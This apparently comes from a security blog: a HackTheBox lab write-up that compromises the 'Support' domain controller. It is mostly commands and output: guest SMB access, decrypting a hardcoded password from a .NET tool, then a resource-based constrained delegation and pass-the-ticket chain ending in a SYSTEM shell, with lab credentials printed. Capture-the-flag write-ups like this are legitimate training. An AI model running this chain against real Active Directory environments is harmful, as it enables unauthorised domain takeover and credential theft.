---
layout: post
title: "Support - HackTheBox Writeup"
date: 2026-06-25
categories: [HackTheBox, ActiveDirectory]
tags: [smb, ldap, bloodhound, rbcd, kerberos]
---

# Reconnaissance

## Host Discovery

Before starting the enumeration, I verified that the target was reachable.

```bash
ping -c 3 10.129.230.181
```

```text
PING 10.129.230.181 (10.129.230.181) 56(84) bytes of data.
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=181 ms
64 bytes from 10.129.230.181: icmp_seq=2 ttl=127 time=186 ms
64 bytes from 10.129.230.181: icmp_seq=3 ttl=127 time=185 ms
```

The responses returned a TTL of **127**, which is commonly associated with Windows hosts (Linux systems typically respond with a TTL close to **64**).

Although TTL alone cannot accurately identify an operating system, it provides a useful initial indicator that the target is likely running Windows.

***

# Port Scanning

To identify exposed services, I performed a full TCP port scan with version detection and default NSE scripts.

```bash
nmap -sCV -vv --disable-arp-ping --min-rate 5000 -p- 10.129.230.181 -oN fullport.nmap
```

The scan revealed several services typically found on an Active Directory Domain Controller.

| Port | Service |
|------|---------|
|53|DNS|
|88|Kerberos|
|135|MSRPC|
|389|LDAP|
|445|SMB|
|5985|WinRM|
|3268|Global Catalog LDAP|

LDAP also revealed the domain name:

```text
support.htb
```

Based on these findings, the target was clearly identified as an **Active Directory Domain Controller**.

To simplify name resolution, I added the domain to `/etc/hosts`.

```bash
echo "10.129.230.181 support.htb" | sudo tee -a /etc/hosts
```

Alternatively, NetExec can automatically populate the hosts file with the NetBIOS name, FQDN and domain name.

```bash
sudo nxc smb 10.129.230.181 --generate-hosts-file /etc/hosts
```

Result:

```text
10.129.230.181 DC.support.htb support.htb DC
```

***

# SMB Enumeration

Since SMB was exposed, I started by checking whether anonymous or guest authentication was allowed.

Anonymous access can often reveal accessible shares or useful domain information.

## Anonymous Authentication

```bash
nxc smb 10.129.230.181 -u '' -p '' --shares
```

Although anonymous authentication succeeded, share enumeration returned **STATUS_ACCESS_DENIED**, indicating that anonymous users were not permitted to enumerate SMB shares.

## Guest Authentication

Next, I tested the built-in Guest account.

```bash
nxc smb 10.129.230.181 -u guest -p '' --shares
```

This time, share enumeration succeeded.

Among the available shares, one immediately stood out:

```
support-tools
```

This share was readable by Guest users and appeared to contain internal tools used by the organization's support staff.

***

# Analyzing the Support Tools

I downloaded the contents of the `support-tools` share and extracted the archive.

Inside it I found a .NET executable named **UserInfo.exe**.

Since .NET applications can easily be decompiled, I inspected the binary using ILSpy.

```bash
ilspycmd UserInfo.exe
```

During the analysis I found the following function:

```csharp
internal class Protected
{
    private static string enc_password = "...";

    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        ...
    }
}
```

The application stored an encrypted password as a Base64 string and recovered it using a simple XOR routine with the key:

```
armando
```

Instead of executing the application, I reproduced the decryption logic in Python.

```python
import base64

enc_password = "..."
key = b"armando"

decoded = base64.b64decode(enc_password)
result = bytearray()

for i in range(len(decoded)):
    result.append(decoded[i] ^ key[i % len(key)] ^ 0xDF)

print(result.decode())
```

Output:

```text
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The recovered string appeared to be a password.

***

# LDAP Enumeration

I tested the recovered credentials against LDAP.

```bash
nxc ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Authentication succeeded.

With valid domain credentials, I collected Active Directory data using RustHound.

```bash
rusthound-ce -d support.htb -i 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c All --zip
```

I also performed manual LDAP enumeration.

```bash
ldapsearch -x -H ldap://10.129.230.181 -D "ldap@support.htb" -W -b "DC=SUPPORT,DC=HTB" "(objectClass=*)"
```

During the enumeration I noticed that the **info** attribute of the `support` user contained what appeared to be plaintext credentials.

These credentials belonged to the `support` account.

***

# Initial Access

BloodHound also showed that the `support` account belonged to the **Remote Management Users** group.

This meant WinRM access was permitted.

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

After authenticating successfully, I obtained the user flag.

***

# Privilege Escalation

At this stage I had a low-privileged shell.

The next objective was identifying privilege escalation opportunities.

After importing the BloodHound data, I found that the `support` account inherited **GenericAll** permissions over the Domain Controller computer object.

This immediately suggested the possibility of abusing **Resource-Based Constrained Delegation (RBCD)**.

Before attempting the attack, I verified the Machine Account Quota.

```bash
nxc ldap 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful' -M maq
```

Output:

```text
MachineAccountQuota: 10
```

Since the quota was greater than zero, the account was allowed to create new computer objects.

***

# Creating a Machine Account

I created a new computer account.

```bash
bloodyAD --host 10.129.230.181 -d support.htb -u support -p 'Ironside47pleasure40Watchful' add computer z2k password123!
```

The computer account was successfully created.

***

# Configuring Resource-Based Constrained Delegation

Next, I configured the Domain Controller object so that my attacker-controlled computer account could impersonate users.

```bash
impacket-rbcd -delegate-from z2k$ -delegate-to DC$ -action write support.htb/support:Ironside47pleasure40Watchful
```

The delegation rights were successfully updated.

At this point, the attacker-controlled computer account was authorized to impersonate users when accessing services running on the Domain Controller.

***

# Requesting a Kerberos Service Ticket

With RBCD configured, I requested a service ticket while impersonating the **Administrator** account.

```bash
getST.py -spn cifs/DC.support.htb -impersonate Administrator support.htb/z2k$:password123!
```

The ticket was generated through the Kerberos **S4U2Self** and **S4U2Proxy** extensions.

***

# Pass-the-Ticket

After exporting the generated ticket,

```bash
export KRB5CCNAME=Administrator@cifs_DC.SUPPORT.HTB@SUPPORT.HTB.ccache
```

I authenticated to the Domain Controller without requiring the Administrator password.

```bash
impacket-psexec support.htb/Administrator@DC.support.htb -k -no-pass
```

The attack successfully resulted in a SYSTEM shell on the Domain Controller.

```text
C:\Windows\system32> whoami

nt authority\system
```

***

# Conclusion

Support is an excellent Active Directory machine that combines several attack techniques throughout the compromise process.

The complete attack chain involved:

- SMB share enumeration
- Reverse engineering a .NET application
- Recovering hardcoded credentials
- LDAP enumeration
- BloodHound privilege analysis
- Resource-Based Constrained Delegation (RBCD)
- Kerberos ticket abuse (S4U2Self/S4U2Proxy)
- Pass-the-Ticket

Unlike many introductory Active Directory labs, Support demonstrates how seemingly unrelated weaknesses—such as exposed internal tools, stored application secrets and delegated permissions—can be chained together to achieve full domain compromise.
